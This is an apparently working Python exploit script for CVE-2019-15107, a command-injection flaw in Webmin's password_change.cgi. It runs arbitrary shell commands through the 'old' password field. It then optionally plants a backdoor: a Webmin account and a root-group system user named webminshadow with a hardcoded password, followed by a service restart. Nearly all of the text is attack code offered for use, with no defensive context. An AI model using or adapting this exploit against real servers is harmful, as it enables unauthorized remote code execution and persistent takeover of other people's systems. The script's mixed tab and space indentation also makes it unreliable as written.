import requests
import re
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import sys
import time


banner ='''
 _______           _______       _______  _______  __     _____       __    _______  __    _______  ______  
(  ____ \|\     /|(  ____ \     / ___   )(  __   )/  \   / ___ \     /  \  (  ____ \/  \  (  __   )/ ___  \ 
| (    \/| )   ( || (    \/     \/   )  || (  )  |\/) ) ( (   ) )    \/) ) | (    \/\/) ) | (  )  |\/   )  )
| |      | |   | || (__             /   )| | /   |  | | ( (___) |      | | | (____    | | | | /   |    /  / 
| |      ( (   ) )|  __)          _/   / | (/ /) |  | |  \____  |      | | (_____ \   | | | (/ /) |   /  /  
| |       \ \_/ / | (            /   _/  |   / | |  | |       ) |      | |       ) )  | | |   / | |  /  /   
| (____/\  \   /  | (____/\     (   (__/\|  (__) |__) (_/\____) )    __) (_/\____) )__) (_|  (__) | /  /    
(_______/   \_/   (_______/_____\_______/(_______)\____/\______/_____\____/\______/ \____/(_______) \_/     
                          (_____)                              (_____)                                      
                                     python By jas502n

'''
print banner



def CVE_2019_15107(url, cmd):
    vuln_url = url + "/password_change.cgi"
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    }
    payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % cmd
    r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
    if r.status_code ==200 and "The current password is " in r.content :
	print "%s is vulnerable" % vuln_url
        print "\nvuln_url= %s" % vuln_url
        m = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
        cmd_result = m.findall(r.content)[0]
        print
        print "Command Result = %s" % cmd_result
	user_act=raw_input("Do you want to pwn this site? Type y or n\n.y will auto create an ssh and webmin user named webminshadow with password webminshadowpass\nn will just exist")
	if user_act == "y" :
			#payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p1
			print"You have choosen %s" %user_act
			print"creating webmin user"
			payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p1
			r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
			if r.status_code ==200 :
				print "webmin user created.\nTrying to assign privileges"
				payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p2
				r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
				if r.status_code ==200 :
					print "Privileges assigned.\nTrying to to set password"
					payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p3
                                	r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
					if r.status_code ==200 :
						print "Webmin Password set.\nWill try to create system user and add them to root group"
                                       	 	payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p5
                                        	r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
						if r.status_code ==200 :
							print "System users created\n Try to ssh  using webminshadow:webminshadowpass"	
							print "Will now assign prives"
                                                        payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p6
                                               		r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
							print"Waiting for 20 secs before proceeding"
							time.sleep(20)
						if r.status_code ==200 :
							print "Will now try to restart webmin service. Try to access the site using webminshadow:webminshadowpass"
							payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % p4
                                                	r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
                                                
				print "All done here"

			else:
				print "An operation failed."
	else:
			print "Exitng Bye"
			
				
    else:
        print "%s isnt vulnerable"% vuln_url


if __name__ == "__main__":
    # url = "https://10.10.20.166:10000"
    url = sys.argv[1]
    cmd = sys.argv[2]
    p1="echo%20%22webminshadow::0%22%20%3E%3E%20/etc/webmin/miniserv.users"
    p2="echo%20%22webminshadow:%20acl%20adsl-client%20ajaxterm%20apache%20at%20backup-config%20bacula-backup%20bandwidth%20bind8%20burner%20change-user%20cluster-copy%20cluster-cron%20cluster-passwd%20cluster-shell%20cluster-software%20cluster-useradmin%20cluster-usermin%20cluster-webmin%20cpan%20cron%20custom%20dfsadmin%20dhcpd%20dovecot%20exim%20exports%20fail2ban%20fdisk%20fetchmail%20filemin%20filter%20firewall%20firewall6%20firewalld%20fsdump%20grub%20heartbeat%20htaccess-htpasswd%20idmapd%20inetd%20init%20inittab%20ipfilter%20ipfw%20ipsec%20iscsi-client%20iscsi-server%20iscsi-target%20iscsi-tgtd%20jabber%20krb5%20ldap-client%20ldap-server%20ldap-useradmin%20logrotate%20lpadmin%20lvm%20mailboxes%20mailcap%20man%20mon%20mount%20mysql%20net%20nis%20openslp%20package-updates%20pam%20pap%20passwd%20phpini%20postfix%20postgresql%20ppp-client%20pptp-client%20pptp-server%20proc%20procmail%20proftpd%20qmailadmin%20quota%20raid%20samba%20sarg%20sendmail%20servers%20shell%20shorewall%20shorewall6%20smart-status%20smf%20software%20spam%20squid%20sshd%20status%20stunnel%20syslog-ng%20syslog%20system-status%20tcpwrappers%20telnet%20time%20tunnel%20updown%20useradmin%20usermin%20vgetty%20webalizer%20webmin%20webmincron%20webminlog%20wuftpd%20xinetd%22%20%3E%3E%20/etc/webmin/webmin.acl"
    p3="/usr/share/webmin/changepass.pl%20/etc/webmin%20webminshadow%20webminshadowpass"
    p4="/etc/init.d/webmin%20restart"
    p5="useradd%20webminshadow%20-p%20webminshadowpass"
    p6="usermod%20-a%20-G%20root%20webminshadow"
    CVE_2019_15107(url, cmd)
